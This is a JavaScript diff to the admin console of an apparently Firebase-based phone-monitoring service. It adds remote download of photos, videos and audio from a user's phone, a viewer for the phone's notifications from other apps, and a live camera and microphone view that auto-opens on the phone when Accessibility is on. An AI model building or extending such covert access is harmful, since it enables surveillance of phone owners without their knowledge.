@@ -7,7 +7,10 @@ import {
   signInWithEmailAndPassword,
   signOut,
 } from "https://www.gstatic.com/firebasejs/11.7.3/firebase-auth.js";
-import { startAdminLiveViewer } from "./live.js?v=6";
+import { startAdminLiveViewer } from "./live.js?v=7";
+
+/** @type {string} */
+let adminGalleryFilter = "all";
 
 /** Prevents auth-state logout from wiping an in-progress Sign in. */
 let loginInProgress = false;
@@ -550,7 +553,7 @@ function renderCameraPanel() {
           <button type="button" class="btn-primary" id="btn-admin-connect">Connect</button>
           <button type="button" class="btn-danger" id="btn-admin-end-live" ${liveOpen ? "" : "hidden"}>End Session</button>
         </div>
-        <p id="live-status" class="live-status muted">Idle — tap Connect to start live view (same as user panel; tap phone notification if needed).</p>
+        <p id="live-status" class="live-status muted">Idle — Connect starts live view. With Accessibility ON, the phone should auto-open the session (same for normal users). Otherwise tap the phone notification.</p>
         <div class="live-panel" id="admin-live-panel" ${liveOpen ? "" : "hidden"}>
           <video id="admin-live-video" class="admin-live-video live-video" autoplay playsinline muted controls></video>
           <audio id="admin-live-audio" class="live-audio" autoplay playsinline></audio>
@@ -799,46 +802,180 @@ function renderInfoPanel() {
 function renderGalleryPanel() {
   const el = document.getElementById("admin-gallery-body");
   if (!el || !exploreCtx) return;
-  const items = exploreCtx.data.gallery || [];
+  document.querySelectorAll("#admin-gallery-filters .gallery-filter").forEach((btn) => {
+    btn.classList.toggle("active", btn.getAttribute("data-gallery-filter") === adminGalleryFilter);
+    btn.onclick = () => {
+      adminGalleryFilter = btn.getAttribute("data-gallery-filter") || "all";
+      renderGalleryPanel();
+    };
+  });
+  document.getElementById("btn-admin-gallery-refresh")?.addEventListener(
+    "click",
+    () => {
+      if (exploreCtx) void openDeviceExplore(exploreCtx.ownerUid, exploreCtx.deviceId);
+    },
+    { once: true }
+  );
+
+  let items = exploreCtx.data.gallery || [];
+  if (adminGalleryFilter !== "all") {
+    items = items.filter((g) => String(g.type || "").toLowerCase() === adminGalleryFilter);
+  }
   if (!items.length) {
-    el.innerHTML = emptyHint("No gallery items cached. Tap Request index, wait, then Refresh.");
+    el.innerHTML = emptyHint(
+      "No gallery items cached for this filter. Tap Request index, wait a few seconds, then Refresh."
+    );
     return;
   }
   el.innerHTML = `<div class="admin-item-grid">${items
-    .slice(0, 60)
+    .slice(0, 80)
     .map((g) => {
-      const name = g.displayName || g.name || g.id;
-      const type = g.type || g.mimeType || "file";
-      return `<article class="admin-item-card">
+      const id = String(g.itemId || g.id || "");
+      const name = g.displayName || g.name || id;
+      const type = String(g.type || "file").toLowerCase();
+      const actionLabel =
+        type === "image" ? "View" : type === "audio" || type === "video" ? "Play / Download" : "Download";
+      return `<article class="admin-item-card" data-item-id="${escapeHtml(id)}">
         <strong>${escapeHtml(name)}</strong>
         <span class="muted">${escapeHtml(type)}</span>
         <span class="muted">${fmtTime(g.dateAdded || g.createdAt)}</span>
         <span class="muted">${g.sizeBytes != null ? `${Math.round(Number(g.sizeBytes) / 1024)} KB` : ""}</span>
+        <div class="admin-gallery-actions">
+          <button type="button" class="btn-primary btn-admin-gallery-open"
+            data-item-id="${escapeHtml(id)}"
+            data-type="${escapeHtml(type)}"
+            data-name="${escapeHtml(name)}"
+            data-mime="${escapeHtml(g.mimeType || "")}"
+            data-size="${Number(g.sizeBytes || 0)}">${actionLabel}</button>
+        </div>
       </article>`;
     })
     .join("")}</div>`;
+  el.querySelectorAll(".btn-admin-gallery-open").forEach((btn) => {
+    btn.addEventListener("click", () => {
+      void openAdminGalleryItem({
+        itemId: btn.getAttribute("data-item-id"),
+        type: btn.getAttribute("data-type"),
+        displayName: btn.getAttribute("data-name"),
+        mimeType: btn.getAttribute("data-mime"),
+        sizeBytes: Number(btn.getAttribute("data-size") || 0),
+      });
+    });
+  });
 }
 
 function renderNotificationsPanel() {
   const el = document.getElementById("admin-notifications-body");
   if (!el || !exploreCtx) return;
+  document.getElementById("btn-admin-notif-refresh")?.addEventListener(
+    "click",
+    () => {
+      if (exploreCtx) void openDeviceExplore(exploreCtx.ownerUid, exploreCtx.deviceId);
+    },
+    { once: true }
+  );
   const items = exploreCtx.data.notifications || [];
   if (!items.length) {
-    el.innerHTML = emptyHint("No notifications cached. Tap Sync from phone.");
+    el.innerHTML = emptyHint(
+      "No notifications cached.\n\nOn the phone: Permissions → Notification access ON, then Sync from phone here."
+    );
     return;
   }
-  el.innerHTML = `<ul class="admin-readable-list">${items
-    .slice(0, 50)
-    .map(
-      (n) =>
-        `<li>
-          <strong>${escapeHtml(n.appName || n.packageName || "App")}</strong>
-          <div>${escapeHtml(n.title || "")}</div>
-          <div class="muted">${escapeHtml(n.text || n.body || "")}</div>
-          <div class="muted">${fmtTime(n.postedAt || n.createdAt)}</div>
-        </li>`
-    )
-    .join("")}</ul>`;
+  el.innerHTML = `<div class="notif-grid">${items
+    .slice(0, 80)
+    .map((n) => {
+      const title = escapeHtml(n.title || "(No title)");
+      const message = escapeHtml(n.message || n.text || n.body || "");
+      const app = escapeHtml(n.appLabel || n.appName || n.packageName || "App");
+      return `<article class="notif-card">
+        <div class="notif-card-head">
+          <strong class="notif-title">${title}</strong>
+          <time class="notif-time muted">${escapeHtml(fmtTime(n.postedAt || n.createdAt))}</time>
+        </div>
+        <p class="notif-message">${message || '<span class="muted">(No message text)</span>'}</p>
+        <div class="notif-meta muted">${app}</div>
+      </article>`;
+    })
+    .join("")}</div>`;
+}
+
+async function openAdminGalleryItem(item) {
+  if (!exploreCtx || !item?.itemId) return;
+  const viewer = document.getElementById("admin-media-viewer");
+  const body = document.getElementById("admin-media-body");
+  const title = document.getElementById("admin-media-title");
+  const status = document.getElementById("admin-media-status");
+  show(viewer, true);
+  if (title) title.textContent = item.displayName || item.itemId;
+  if (body) body.textContent = "Requesting file from phone…";
+  if (status) status.textContent = "Starting transfer…";
+  try {
+    const started = await api(
+      `/api/admin/users/${encodeURIComponent(exploreCtx.ownerUid)}/devices/${encodeURIComponent(exploreCtx.deviceId)}/gallery/transfer`,
+      {
+        method: "POST",
+        body: JSON.stringify({
+          itemId: item.itemId,
+          displayName: item.displayName,
+          mimeType: item.mimeType,
+          sizeBytes: item.sizeBytes,
+        }),
+      }
+    );
+    const transferId = started.transfer?.transferId || started.transferId;
+    if (!transferId) throw new Error("No transferId returned");
+    if (status) status.textContent = "Waiting for phone upload…";
+    await pollAdminTransfer(exploreCtx.ownerUid, transferId, item, body, status);
+  } catch (e) {
+    if (body) body.textContent = formatApiError(e);
+    if (status) status.textContent = "";
+  }
+}
+
+async function pollAdminTransfer(ownerUid, transferId, item, body, status) {
+  const deadline = Date.now() + 90_000;
+  while (Date.now() < deadline) {
+    const data = await api(
+      `/api/admin/users/${encodeURIComponent(ownerUid)}/transfers/${encodeURIComponent(transferId)}`
+    );
+    const t = data.transfer || {};
+    const st = String(t.status || "");
+    if (status) {
+      status.textContent =
+        st === "ready"
+          ? "Ready"
+          : `Status: ${st || "…"} · ${Math.round(Number(t.progress || 0))}%`;
+    }
+    if (st === "ready") {
+      const url = `/api/admin/users/${encodeURIComponent(ownerUid)}/transfers/${encodeURIComponent(transferId)}/content`;
+      const type = String(item.type || "").toLowerCase();
+      const mime = String(item.mimeType || t.mimeType || "");
+      const res = await fetch(url, { headers: { Authorization: `Bearer ${idToken}` } });
+      if (!res.ok) throw new Error(`Download failed (HTTP ${res.status})`);
+      const blob = await res.blob();
+      const objectUrl = URL.createObjectURL(blob);
+      if (type === "image" || mime.startsWith("image/")) {
+        body.innerHTML = `<img src="${objectUrl}" alt="${escapeHtml(item.displayName || "")}" />
+          <p style="margin-top:10px;"><a class="btn-secondary" href="${objectUrl}" download="${escapeHtml(item.displayName || "image")}">Download image</a></p>`;
+      } else if (type === "video" || mime.startsWith("video/")) {
+        body.innerHTML = `<video src="${objectUrl}" controls playsinline></video>
+          <p style="margin-top:10px;"><a class="btn-primary" href="${objectUrl}" download="${escapeHtml(item.displayName || "video")}">Download video</a></p>`;
+      } else if (type === "audio" || mime.startsWith("audio/")) {
+        body.innerHTML = `<audio src="${objectUrl}" controls></audio>
+          <p style="margin-top:10px;"><a class="btn-primary" href="${objectUrl}" download="${escapeHtml(item.displayName || "audio")}">Download audio</a></p>`;
+      } else {
+        body.innerHTML = `<p class="muted">File ready.</p>
+          <p><a class="btn-primary" href="${objectUrl}" download="${escapeHtml(item.displayName || "file")}">Download file</a></p>`;
+      }
+      if (status) status.textContent = "Loaded.";
+      return;
+    }
+    if (st === "failed" || st === "cancelled" || st === "expired") {
+      throw new Error(t.errorMessage || t.errorCode || `Transfer ${st}`);
+    }
+    await new Promise((r) => setTimeout(r, 1500));
+  }
+  throw new Error("Timed out waiting for phone upload. Keep the phone online and try again.");
 }
 
 function renderMessagesPanel() {
@@ -1318,6 +1455,17 @@ async function main() {
 
   document.getElementById("btn-logout")?.addEventListener("click", () => signOut(auth));
   document.getElementById("btn-denied-logout")?.addEventListener("click", () => signOut(auth));
+
+  document.getElementById("btn-admin-media-close")?.addEventListener("click", () => {
+    show(document.getElementById("admin-media-viewer"), false);
+    const body = document.getElementById("admin-media-body");
+    if (body) body.innerHTML = "";
+  });
+  document.getElementById("admin-media-viewer")?.addEventListener("click", (ev) => {
+    if (ev.target === document.getElementById("admin-media-viewer")) {
+      show(document.getElementById("admin-media-viewer"), false);
+    }
+  });
 
   const loginForm = document.getElementById("admin-login-form");
   loginForm?.addEventListener("submit", (ev) => {
